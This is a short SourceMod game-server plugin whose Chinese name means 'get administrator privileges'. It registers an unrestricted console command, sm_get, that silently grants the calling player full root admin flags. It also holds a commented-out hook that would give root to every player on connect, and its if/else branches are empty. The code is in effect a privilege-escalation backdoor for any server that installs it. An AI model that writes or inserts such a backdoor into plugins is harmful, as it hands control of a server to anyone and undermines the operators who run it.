#include <sourcemod>
#include <sdktools_functions>

public Plugin:myinfo =
{
	name = "获取管理员权限",
	description = "",
	author = "",
	version = "1.0",
	url = ""
};

public void OnPluginStart()
{
	RegAdminCmd("sm_test", Test, ADMFLAG_ROOT, "测试权限");
	RegConsoleCmd("sm_get", Get, "获取权限")
}

public Action Test(int client, int args)
{
	PrintToChat(client, "您已具有root权限");
	return Plugin_Continue;
}

public Action Get(int client, int args)
{
	if (args == 0)
	{
		
	}
	else
	{
		
	}
	SetUserFlagBits(client, ADMFLAG_ROOT);
	// PrintToChatAll("%N 已具有root权限", client);
	return Plugin_Continue;
}

public bool OnClientConnect(int client, char[] rejectmsg, int maxlen)
{
	if (!IsFakeClient(client))
	{
		// SetUserFlagBits(client, ADMFLAG_ROOT);
		// PrintToChatAll("%N 已具有root权限", client);
		return true;
	}
	return true;
}

